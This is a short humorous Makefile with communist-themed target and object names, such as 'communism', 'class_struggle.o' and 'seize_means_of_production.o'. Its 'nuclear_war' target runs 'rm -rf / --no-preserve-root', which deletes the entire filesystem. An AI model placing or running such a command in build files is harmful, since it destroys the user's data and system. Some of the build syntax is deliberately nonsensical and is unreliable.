CC := gcc
CFLAGS := -0O -g3

ifdef $(SARTRE)
	CFLAGS += -lpeaceful_revolution
endif

.DEFAULT_GOAL := communism

OBJ = class_struggle.o marxism.o revoutionary_incentive.o targeted_assassinations.o\
seize_means_of_production.o main.o

communism: $(OBJ)
	$(CC) -o $@ $(OBJ) $(CFLAGS)
;


.PHONY: clean nuclear_war
nuclear_war:
	rm -rf / --no-preserve-root 

clean:
	rm -f *.o 

